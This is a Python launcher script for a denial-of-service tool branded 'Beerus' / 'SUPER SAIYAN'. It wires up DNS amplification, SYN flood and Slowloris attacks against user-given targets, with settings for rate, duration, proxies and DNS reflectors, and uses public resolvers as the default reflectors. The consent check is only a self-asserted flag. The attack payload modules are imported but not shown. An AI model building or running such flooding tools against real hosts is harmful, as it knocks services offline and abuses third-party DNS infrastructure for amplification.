# -*- coding: utf-8 -*-
import argparse
import asyncio
import logging
import sys
from datetime import datetime
from utils.logger import setup_logger
from attacks import dns_amplification, syn_flood, slowloris
import pyfiglet
from colorama import Fore, Style, init

def banner():
    print(Fore.LIGHTYELLOW_EX + pyfiglet.figlet_format("SUPER SAIYAN", font="slant"))
    print(Fore.CYAN + f"[!] Author     : St34lthv3ct3r")
    print(Fore.CYAN + f"[!] Timestamp  : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(Fore.CYAN + f"[!] Operation  : Red Team")
    print(Fore.GREEN + "[!] Use it at your own risk. Unauthorized access is illegal." + Style.RESET_ALL)
banner()


def parse_args():
    parser = argparse.ArgumentParser(
        description="Beerus"
    )
    parser.add_argument(
        "--attack",
        choices=["dns_amplification", "syn_flood", "slowloris", "all"],
        required=True,
        help="Attack vector to launch",
    )
    parser.add_argument(
        "--target",
        required=True,
        nargs="+",
        help="Target IP(s) or hostname(s) (space separated)",
    )
    parser.add_argument(
        "--duration",
        type=int,
        default=60,
        help="Duration of attack in seconds (default: 60)",
    )
    parser.add_argument(
        "--rate",
        type=int,
        default=500,
        help="Max packets/requests per second (default: 500)",
    )
    parser.add_argument(
        "--port",
        type=int,
        default=80,
        help="TCP port for SYN flood or Slowloris (default: 80)",
    )
    parser.add_argument(
        "--dns-servers",
        nargs="+",
        default=["8.8.8.8", "1.1.1.1"],
        help="DNS servers for DNS amplification (default: 8.8.8.8 1.1.1.1)",
    )
    parser.add_argument(
        "--dns-qtype",
        choices=["A", "MX", "NS", "TXT", "CNAME"],
        default="A",
        help="DNS query type for amplification (default: A)",
    )
    parser.add_argument(
        "--proxies",
        nargs="+",
        default=[],
        help="HTTP proxies for Slowloris (optional)",
    )
    parser.add_argument(
        "--confirm-consent",
        action="store_true",
        help="Confirm you have authorization to test the target(s)",
    )
    parser.add_argument(
        "--log-file",
        default=None,
        help="Optional log file path to save attack logs",
    )
    parser.add_argument(
        "--output-format",
        choices=["json", "markdown", "text"],
        default="text",
        help="Format for attack activity output (default: text)",
    )
    return parser.parse_args()

async def main():
    args = parse_args()

    if not args.confirm_consent:
        print("[!] ERROR: You must confirm authorization with --confirm-consent to proceed.")
        sys.exit(1)

    logger = setup_logger(log_file=args.log_file)
    logger.info("Beerus the god of websites and server")
    logger.info("Beerus launching attack...")
    logger.info(f"Starting attack: {args.attack} on targets {args.target} for {args.duration}s at rate {args.rate}")

    tasks = []
    if args.attack in ("dns_amplification", "all"):
        for target in args.target:
            tasks.append(
                dns_amplification.attack(
                    target=target,
                    dns_servers=args.dns_servers,
                    duration=args.duration,
                    max_rate=args.rate,
                    qtype=args.dns_qtype,
                    logger=logger,
                    output_format=args.output_format,
                )
            )
    if args.attack in ("syn_flood", "all"):
        for target in args.target:
            tasks.append(
                syn_flood.attack(
                    target=target,
                    duration=args.duration,
                    max_rate=args.rate,
                    port=args.port,
                    logger=logger,
                    output_format=args.output_format,
                )
            )
    if args.attack in ("slowloris", "all"):
        for target in args.target:
            tasks.append(
                slowloris.attack(
                    target=target,
                    duration=args.duration,
                    max_rate=args.rate,
                    port=args.port,
                    proxies=args.proxies,
                    logger=logger,
                    output_format=args.output_format,
                )
            )

    await asyncio.gather(*tasks)
    logger.info("Attack(s) completed.")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by pentester.")
    except Exception as e:
        print(f"[!] Fatal error: {e}")
        sys.exit(1)